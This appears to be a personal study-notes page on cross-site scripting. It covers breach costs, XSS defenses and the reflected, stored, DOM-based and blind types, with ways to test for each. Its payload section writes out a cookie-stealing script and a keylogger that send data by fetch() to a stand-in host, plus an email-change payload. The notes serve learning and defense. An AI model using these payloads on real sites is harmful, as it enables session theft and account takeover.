<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><title>Cross Site</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="Cross Site"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://tysonnguyen.github.io/IBM-cybersecurity/notes/9580eaxs80sdsmko50z0kh2/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="5/22/2022"/><meta property="article:modified_time" content="7/9/2022"/><link rel="canonical" href="https://tysonnguyen.github.io/IBM-cybersecurity/notes/9580eaxs80sdsmko50z0kh2/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" as="style"/><link rel="stylesheet" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/IBM-cybersecurity/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/IBM-cybersecurity/_next/static/chunks/webpack-b7a0bb0748951285.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/main-3d5e78ffcdd2778f.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/_app-b0ef1900ae658bfa.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/78-13ae6acd5ce7ca5b.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/373-2f3879190a46a3d9.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/notes/%5Bid%5D-69449972c2a725d8.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_buildManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_ssgManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout site-layout" style="margin-top:64px"><section class="ant-layout site-layout"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><section class="ant-layout side-layout-main" style="max-width:1200px;display:initial"><main class="ant-layout-content main-content" role="main" style="padding:0 24px"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="cross-site"><a aria-hidden="true" class="anchor-heading icon-link" href="#cross-site"></a>Cross Site</h1>
<h1 id="cross-site-scripting"><a aria-hidden="true" class="anchor-heading icon-link" href="#cross-site-scripting"></a>Cross-Site Scripting</h1>
<h2 id="security-defects-become-famous"><a aria-hidden="true" class="anchor-heading icon-link" href="#security-defects-become-famous"></a>Security Defects Become Famous</h2>
<ul>
<li>Heartbleed and Shellshock in 2014 software security bugs.</li>
<li>Recent Wikileaks exposure of CIA research into weaponizing iOS, Android and Samsung TV security bugs.</li>
<li>Security researchers are trying to cash in on the fame.</li>
<li>Bugs in security software are sensational (software is supposed to protect you).</li>
<li>ALL major software vendors are target, especially security software.</li>
<li>Costs to reputation and revenue.</li>
<li>Could lead to litigations, and law enforcement investigations.
<ul>
<li>Since 2000, the FTC has issued over 45 consent decrees against companies failed to institute sufficient security practices while delivering software or services.</li>
</ul>
</li>
</ul>
<h3 id="why-care"><a aria-hidden="true" class="anchor-heading icon-link" href="#why-care"></a>Why Care?</h3>
<ul>
<li>Average total cost of data breach in 2017 (Ponemon Study) is $3.62 million.</li>
<li>58% of Internet users use the same password for multiple sites, including their web mail.</li>
<li>There is a growing black market for zero-day vulnerabilities.
<ul>
<li>Vulnerabilities sell of thousands to millions of dollars per exploit, earning hackers serious money.</li>
</ul>
</li>
</ul>
<h4 id="breaches"><a aria-hidden="true" class="anchor-heading icon-link" href="#breaches"></a>Breaches</h4>
<ul>
<li><strong>Jan 2017 Trend Micro</strong> - Two researchers found 223 vulnerabilities in just 6 months. Massive damage to reputation as a cybersecurity vendor.</li>
<li><strong>Oct 2017 Equifax</strong> - 143 million stolen SSNs. CSO, CIO, CEO lost their jobs.</li>
<li><strong>Dec 2013 Target</strong> - 40+ million credit cards, 70-110 million name, address, phone, email addresses.
<ul>
<li>Total cost may reach over $1B in fines and other associated costs.</li>
</ul>
</li>
<li><strong>March 2011 RSA Security</strong> - 40 million auth tokens for bank and government networks $66M plus loss.</li>
</ul>
<h2 id="secure-software-challenges"><a aria-hidden="true" class="anchor-heading icon-link" href="#secure-software-challenges"></a>Secure Software Challenges</h2>






























<table><thead><tr><th></th><th>Developers</th><th>Hackers</th></tr></thead><tbody><tr><td>Time</td><td>Under time pressure to develop and test functionality</td><td>May have unlimited time</td></tr><tr><td>Focus</td><td>Security is not the primary focus over functionality</td><td>Focused on finding security holes</td></tr><tr><td>Motivation / Resources</td><td>Responsible to product's primary functionality</td><td>Bragging rights, illicit profits</td></tr><tr><td>Specialization</td><td>Specialize on functionality of the product</td><td>Specialize in security penetration</td></tr></tbody></table>
<h3 id="mitigate-product-security-risk"><a aria-hidden="true" class="anchor-heading icon-link" href="#mitigate-product-security-risk"></a>Mitigate Product Security Risk</h3>
<h4 id="prevent-new-bugs"><a aria-hidden="true" class="anchor-heading icon-link" href="#prevent-new-bugs"></a>Prevent New Bugs</h4>
<ul>
<li>Know SANS 25 Most Dangerous Programming Errors (includes most of common security Top 10).</li>
<li>"Think like a hacker". How can code be abused?</li>
<li>Build software defenses into software:
<ul>
<li>Input Validation</li>
<li>Output Sanitization</li>
<li>Strong Encryption</li>
<li>Strong Authentication and Authorization</li>
</ul>
</li>
<li>Choose secure frameworks rather than simply reply on developer security skills.</li>
<li>Do not think product is isolated from the Internet is not at risk.</li>
<li>Do not think that if a file or a database is local does not need to be protected. The majority of breaches are launched internally.</li>
</ul>
<h4 id="address-existing-bugs"><a aria-hidden="true" class="anchor-heading icon-link" href="#address-existing-bugs"></a>Address Existing Bugs</h4>
<ul>
<li>Redesign product front end to be good looking and functional, but also secure.</li>
<li>Implement smart architectural changes that fix security flaws at the top.</li>
<li>Do not spot-fix issues.
<ul>
<li>Implement a fix across the board and how to be prevented in the future.</li>
</ul>
</li>
<li>Security bugs are special because of their potential impact.</li>
<li>Deliver security patches with faster release vehicles.</li>
</ul>
<h2 id="common-attacks---cross-site-scripting"><a aria-hidden="true" class="anchor-heading icon-link" href="#common-attacks---cross-site-scripting"></a>Common Attacks - Cross-Site Scripting</h2>
<p>Cross-Site Scripting (XSS)
: Allows attackers to inject client-side scripts into the web page.</p>
<h3 id="dangers-of-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#dangers-of-xss"></a>Dangers of XSS</h3>
<ul>
<li>Harvest credentials</li>
<li>Take over user sessions</li>
<li>CSRF</li>
<li>Steal cookies, local store data</li>
<li>Elevate privileges</li>
<li>Redirect users to malicious sites</li>
</ul>
<p>XSS is widespread in 3rd party products such as WordPress and Drupal.</p>
<h3 id="in-the-news"><a aria-hidden="true" class="anchor-heading icon-link" href="#in-the-news"></a>In the News</h3>
<p>Cross-site scripting vulnerabilities are extremely common. Below are a few reports of XSS found in massive applications:</p>
<ul>
<li>eBay XSS bug left users vulnerable to (almost) undetectable phishing attacks.</li>
<li>The Apache Foundation hacked by exploiting XSS in JIRA.</li>
<li>XSS found in Shopify.</li>
<li>$7,500 for XSS found in Steam chat.</li>
<li>$2,500 for XSS in HackerOne.</li>
<li>XSS found in Infogram.</li>
</ul>
<h3 id="effective-defenses"><a aria-hidden="true" class="anchor-heading icon-link" href="#effective-defenses"></a>Effective Defenses</h3>
<h4 id="html-encoding"><a aria-hidden="true" class="anchor-heading icon-link" href="#html-encoding"></a>HTML Encoding</h4>
<ul>
<li>Output Encoding works well for server side generate pages and is quite effective in neutralizing most XSS payloads.
<ul>
<li>HTML Encoding alone will not prevent charset attacks.</li>
</ul>
</li>
</ul>
<h4 id="javascript-escaping"><a aria-hidden="true" class="anchor-heading icon-link" href="#javascript-escaping"></a>JavaScript Escaping</h4>
<ul>
<li>XSS can be introduced with JavaScript code.</li>
<li>Escaping single quotes will prevent injection.</li>
</ul>
<h4 id="safe-dom-elements"><a aria-hidden="true" class="anchor-heading icon-link" href="#safe-dom-elements"></a>Safe DOM Elements</h4>
<ul>
<li>XSS in modern Rich Client UIs is often made possible by unsafe handling of the DOM.</li>
<li>Using the <code>innerHtml</code> attribute allows the user input to be rendered as HTML and XSS with JavaScript events as possible.</li>
<li>The safe alternative is to use <code>textContent</code> (or <code>innerText</code> in some versions of IE).</li>
</ul>
<h4 id="use-eval-and-dynamic-code-generation-with-care"><a aria-hidden="true" class="anchor-heading icon-link" href="#use-eval-and-dynamic-code-generation-with-care"></a>Use Eval and Dynamic Code Generation with Care</h4>
<ul>
<li>JavaScript <code>eval()</code> function which accepts a JavaScript expression as a string argument and executes it. Use of this function is discouraged.</li>
<li>Same care is needed when the code generates pieces of JavaScript dynamically. Also discouraged.</li>
</ul>
<h4 id="input-validation"><a aria-hidden="true" class="anchor-heading icon-link" href="#input-validation"></a>Input Validation</h4>
<p><strong>Whitelisting</strong> is recommended.</p>
<ul>
<li>Reduces the attack surface to a known quantity.</li>
<li>If possible, most input should be whitelisted to alphanumeric to prevent XSS (and many other attacks).</li>
<li>Special characters should only be allowed on an exception basis.</li>
<li>Some cases may be relaxed to allow single quotes or other characters.</li>
</ul>
<p><strong>Blacklisting</strong> - NOT RECOMMENDED.</p>
<ul>
<li>Creative attacker may bypass blacklist by trying a previously unknown method.</li>
</ul>
<p><strong>Client Side Input Validation</strong> - NOT RECOMMENDED.</p>
<ul>
<li>Can only be used to assist with product usability.</li>
<li>Attackers can easily bypass it by sending the request directly to the server.</li>
</ul>
<h4 id="use-proven-validation-and-encoding-functionality"><a aria-hidden="true" class="anchor-heading icon-link" href="#use-proven-validation-and-encoding-functionality"></a>Use Proven Validation and Encoding Functionality</h4>
<ul>
<li>Protect both input and output - "Defense in Depth" principle.</li>
<li>As you validate the input and encode the output, use proven and reputable libraries.</li>
<li>It is best to implement a framework that has one central set of functionality that validates and encodes data.</li>
</ul>
<h2 id="xss-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#xss-payloads"></a>XSS Payloads</h2>
<p>In XSS, the payload is the JavaScript code we wish to be executed on the target's computer. There are two parts to the payload: the intention and the modification.</p>
<ul>
<li>Intention is what you wish the JavaScript to actually do.</li>
<li>Modification is the changes to the code we need to make it execute as every scenario is different.</li>
</ul>
<p>Examples of XSS Intentions:</p>
<ul>
<li><strong>Proof of Concept</strong>: Simplest payload to demonstrate XSS is possible on a website - causing an alert box to pop up on the page with a string of text.
<ul>
<li><code>&#x3C;script>alert('XSS');&#x3C;/script></code></li>
</ul>
</li>
<li><strong>Session Stealing</strong>: Details of a user's session, such as login tokens, are often kept in cookies on the target's machine.
<ul>
<li><code>&#x3C;script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));&#x3C;/script></code>
<ul>
<li>Takes target's cookie, base64 encodes the cookie to ensure successful transmission for control to be logged in.</li>
</ul>
</li>
</ul>
</li>
<li><strong>Key Logger</strong>: Acts as a key logger where anything typed on the webpage will be forwarded to a website under the hacker's control.
<ul>
<li><code>&#x3C;script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}&#x3C;/script></code></li>
</ul>
</li>
<li><strong>Business Logic</strong>: Calls a particular network resource or a JavaScript function. In this example for changing the email's address called <code>user.changeEmail()</code>.
<ul>
<li><code>&#x3C;script>user.changeEmail('attacker@hacker.thm');&#x3C;/script></code>
<ul>
<li>Allows a password reset for the attacker.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="reflected-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#reflected-xss"></a>Reflected XSS</h3>
<p>Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png" alt="reflected-error">
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png" alt="reflected"></p>
<p>A website where entering the incorrect input, an error message is displayed to the parameter in the query string directly into the page source.</p>
<ul>
<li>The application does not check the contents of the error parameter, which allows the attacker to insert the malicious code.</li>
</ul>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png" alt="xss"></p>
<ul>
<li>The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute on their browser, potentially revealing session or customer information.</li>
</ul>
<h4 id="how-to-test-for-reflected-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-reflected-xss"></a>How to Test for Reflected XSS</h4>
<p>Check every possible point of entry:</p>
<ul>
<li>Parameters in the URL query string</li>
<li>URL file path</li>
<li>Sometimes HTTP headers (unlikely exploitable)</li>
</ul>
<h3 id="stored-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#stored-xss"></a>Stored XSS</h3>
<p>The XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png" alt="stored-XSS"></p>
<p>A blog website that allows users to post comments, but these comments are not checked or filtered for any malicious JavaScript code.</p>
<ul>
<li>The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.</li>
</ul>
<h4 id="how-to-test-for-stored-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-stored-xss"></a>How to Test for Stored XSS</h4>
<p>Test every possible entry point where it seems data is stored and then shown back in areas that other users have access to:</p>
<ul>
<li>Comments on a blog</li>
<li>User profile information</li>
<li>Website listings</li>
</ul>
<h3 id="dom-based-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#dom-based-xss"></a>DOM-Based XSS</h3>
<p>DOM stands for Document Object Model and is a programming interface for HTML and XML documents. A web page is a document, and this document can be either displayed in the browser window or as the HTML source.</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24a54ac532b5820bf0ffdddf00ab2247.png" alt="DOM"></p>
<ul>
<li>DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</li>
<li>Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.
<ul>
<li>An example: JavaScript gets the contents from the <code>window.location.hash</code> parameter and then writes that onto the page in the currently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto their webpage.</li>
</ul>
</li>
</ul>
<h4 id="how-to-test-for-dom-based-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-dom-based-xss"></a>How to Test for DOM Based XSS</h4>
<p>Challenging to test for and requires a certain amount of JavaScript knowledge to read the source code.</p>
<ul>
<li>Look for parts of code that access certain variables that an attacker can have control over, such as 'window.location.x' parameters.
<ul>
<li>See how they are handled and whether the values are written to the web page's DOM or passed to unsafe JavaScript methods such as <code>eval()</code>.</li>
</ul>
</li>
</ul>
<h3 id="blind-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#blind-xss"></a>Blind XSS</h3>
<p>Blind XSS is similar to a stored XSS in that the payload gets stored on the website for another user to view, but in this instance, can't see the payload working or be able to test it against yourself first.</p>
<p>A website has a contact form where you can message a member of staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish.</p>
<ul>
<li>Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page viewed.</li>
</ul>
<h4 id="how-to-test-for-blind-xss"><a aria-hidden="true" class="anchor-heading icon-link" href="#how-to-test-for-blind-xss"></a>How to Test for Blind XSS</h4>
<ul>
<li>When testing for Blind XSS vulnerabilities, need to ensure payload has a call back (usually an HTTP request) to know is being executed.</li>
<li>A popular tool for Blind XSS attacks is <a href="https://xsshunter.com/">xsshunter</a>.</li>
</ul></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#cross-site-scripting" title="Cross-Site Scripting">Cross-Site Scripting</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#security-defects-become-famous" title="Security Defects Become Famous">Security Defects Become Famous</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#why-care" title="Why Care?">Why Care?</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#breaches" title="Breaches">Breaches</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#secure-software-challenges" title="Secure Software Challenges">Secure Software Challenges</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#mitigate-product-security-risk" title="Mitigate Product Security Risk">Mitigate Product Security Risk</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#prevent-new-bugs" title="Prevent New Bugs">Prevent New Bugs</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#address-existing-bugs" title="Address Existing Bugs">Address Existing Bugs</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#common-attacks---cross-site-scripting" title="Common Attacks - Cross-Site Scripting">Common Attacks - Cross-Site Scripting</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#dangers-of-xss" title="Dangers of XSS">Dangers of XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#in-the-news" title="In the News">In the News</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#effective-defenses" title="Effective Defenses">Effective Defenses</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#html-encoding" title="HTML Encoding">HTML Encoding</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#javascript-escaping" title="JavaScript Escaping">JavaScript Escaping</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#safe-dom-elements" title="Safe DOM Elements">Safe DOM Elements</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#use-eval-and-dynamic-code-generation-with-care" title="Use Eval and Dynamic Code Generation with Care">Use Eval and Dynamic Code Generation with Care</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#input-validation" title="Input Validation">Input Validation</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#use-proven-validation-and-encoding-functionality" title="Use Proven Validation and Encoding Functionality">Use Proven Validation and Encoding Functionality</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#xss-payloads" title="XSS Payloads">XSS Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#reflected-xss" title="Reflected XSS">Reflected XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#how-to-test-for-reflected-xss" title="How to Test for Reflected XSS">How to Test for Reflected XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#stored-xss" title="Stored XSS">Stored XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#how-to-test-for-stored-xss" title="How to Test for Stored XSS">How to Test for Stored XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#dom-based-xss" title="DOM-Based XSS">DOM-Based XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#how-to-test-for-dom-based-xss" title="How to Test for DOM Based XSS">How to Test for DOM Based XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#blind-xss" title="Blind XSS">Blind XSS</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#how-to-test-for-blind-xss" title="How to Test for Blind XSS">How to Test for Blind XSS</a></div></div></div></div></div></div></div></div></div></main><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></section></section></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"9580eaxs80sdsmko50z0kh2","title":"Cross Site","desc":"","updated":1657329821484,"created":1653197938259,"custom":{},"fname":"scripting.cross-site","type":"note","vault":{"fsPath":"vault"},"contentHash":"594053ed0c3015245afea552503d6212","links":[],"anchors":{"cross-site-scripting":{"type":"header","text":"Cross-Site Scripting","value":"cross-site-scripting","line":8,"column":0,"depth":1},"security-defects-become-famous":{"type":"header","text":"Security Defects Become Famous","value":"security-defects-become-famous","line":10,"column":0,"depth":2},"why-care":{"type":"header","text":"Why Care?","value":"why-care","line":21,"column":0,"depth":3},"breaches":{"type":"header","text":"Breaches","value":"breaches","line":28,"column":0,"depth":4},"secure-software-challenges":{"type":"header","text":"Secure Software Challenges","value":"secure-software-challenges","line":36,"column":0,"depth":2},"mitigate-product-security-risk":{"type":"header","text":"Mitigate Product Security Risk","value":"mitigate-product-security-risk","line":45,"column":0,"depth":3},"prevent-new-bugs":{"type":"header","text":"Prevent New Bugs","value":"prevent-new-bugs","line":47,"column":0,"depth":4},"address-existing-bugs":{"type":"header","text":"Address Existing Bugs","value":"address-existing-bugs","line":60,"column":0,"depth":4},"common-attacks---cross-site-scripting":{"type":"header","text":"Common Attacks - Cross-Site Scripting","value":"common-attacks---cross-site-scripting","line":69,"column":0,"depth":2},"dangers-of-xss":{"type":"header","text":"Dangers of XSS","value":"dangers-of-xss","line":74,"column":0,"depth":3},"in-the-news":{"type":"header","text":"In the News","value":"in-the-news","line":85,"column":0,"depth":3},"effective-defenses":{"type":"header","text":"Effective Defenses","value":"effective-defenses","line":97,"column":0,"depth":3},"html-encoding":{"type":"header","text":"HTML Encoding","value":"html-encoding","line":99,"column":0,"depth":4},"javascript-escaping":{"type":"header","text":"JavaScript Escaping","value":"javascript-escaping","line":104,"column":0,"depth":4},"safe-dom-elements":{"type":"header","text":"Safe DOM Elements","value":"safe-dom-elements","line":109,"column":0,"depth":4},"use-eval-and-dynamic-code-generation-with-care":{"type":"header","text":"Use Eval and Dynamic Code Generation with Care","value":"use-eval-and-dynamic-code-generation-with-care","line":115,"column":0,"depth":4},"input-validation":{"type":"header","text":"Input Validation","value":"input-validation","line":120,"column":0,"depth":4},"use-proven-validation-and-encoding-functionality":{"type":"header","text":"Use Proven Validation and Encoding Functionality","value":"use-proven-validation-and-encoding-functionality","line":138,"column":0,"depth":4},"xss-payloads":{"type":"header","text":"XSS Payloads","value":"xss-payloads","line":144,"column":0,"depth":2},"reflected-xss":{"type":"header","text":"Reflected XSS","value":"reflected-xss","line":164,"column":0,"depth":3},"how-to-test-for-reflected-xss":{"type":"header","text":"How to Test for Reflected XSS","value":"how-to-test-for-reflected-xss","line":179,"column":0,"depth":4},"stored-xss":{"type":"header","text":"Stored XSS","value":"stored-xss","line":187,"column":0,"depth":3},"how-to-test-for-stored-xss":{"type":"header","text":"How to Test for Stored XSS","value":"how-to-test-for-stored-xss","line":197,"column":0,"depth":4},"dom-based-xss":{"type":"header","text":"DOM-Based XSS","value":"dom-based-xss","line":205,"column":0,"depth":3},"how-to-test-for-dom-based-xss":{"type":"header","text":"How to Test for DOM Based XSS","value":"how-to-test-for-dom-based-xss","line":215,"column":0,"depth":4},"blind-xss":{"type":"header","text":"Blind XSS","value":"blind-xss","line":222,"column":0,"depth":3},"how-to-test-for-blind-xss":{"type":"header","text":"How to Test for Blind XSS","value":"how-to-test-for-blind-xss","line":230,"column":0,"depth":4}},"children":[],"parent":"ptonz0zapnutyahjkedfn8f","data":{}},"body":"\u003ch1 id=\"cross-site\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#cross-site\"\u003e\u003c/a\u003eCross Site\u003c/h1\u003e\n\u003ch1 id=\"cross-site-scripting\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#cross-site-scripting\"\u003e\u003c/a\u003eCross-Site Scripting\u003c/h1\u003e\n\u003ch2 id=\"security-defects-become-famous\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#security-defects-become-famous\"\u003e\u003c/a\u003eSecurity Defects Become Famous\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eHeartbleed and Shellshock in 2014 software security bugs.\u003c/li\u003e\n\u003cli\u003eRecent Wikileaks exposure of CIA research into weaponizing iOS, Android and Samsung TV security bugs.\u003c/li\u003e\n\u003cli\u003eSecurity researchers are trying to cash in on the fame.\u003c/li\u003e\n\u003cli\u003eBugs in security software are sensational (software is supposed to protect you).\u003c/li\u003e\n\u003cli\u003eALL major software vendors are target, especially security software.\u003c/li\u003e\n\u003cli\u003eCosts to reputation and revenue.\u003c/li\u003e\n\u003cli\u003eCould lead to litigations, and law enforcement investigations.\n\u003cul\u003e\n\u003cli\u003eSince 2000, the FTC has issued over 45 consent decrees against companies failed to institute sufficient security practices while delivering software or services.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"why-care\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#why-care\"\u003e\u003c/a\u003eWhy Care?\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAverage total cost of data breach in 2017 (Ponemon Study) is $3.62 million.\u003c/li\u003e\n\u003cli\u003e58% of Internet users use the same password for multiple sites, including their web mail.\u003c/li\u003e\n\u003cli\u003eThere is a growing black market for zero-day vulnerabilities.\n\u003cul\u003e\n\u003cli\u003eVulnerabilities sell of thousands to millions of dollars per exploit, earning hackers serious money.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"breaches\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#breaches\"\u003e\u003c/a\u003eBreaches\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eJan 2017 Trend Micro\u003c/strong\u003e - Two researchers found 223 vulnerabilities in just 6 months. Massive damage to reputation as a cybersecurity vendor.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOct 2017 Equifax\u003c/strong\u003e - 143 million stolen SSNs. CSO, CIO, CEO lost their jobs.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDec 2013 Target\u003c/strong\u003e - 40+ million credit cards, 70-110 million name, address, phone, email addresses.\n\u003cul\u003e\n\u003cli\u003eTotal cost may reach over $1B in fines and other associated costs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMarch 2011 RSA Security\u003c/strong\u003e - 40 million auth tokens for bank and government networks $66M plus loss.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"secure-software-challenges\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#secure-software-challenges\"\u003e\u003c/a\u003eSecure Software 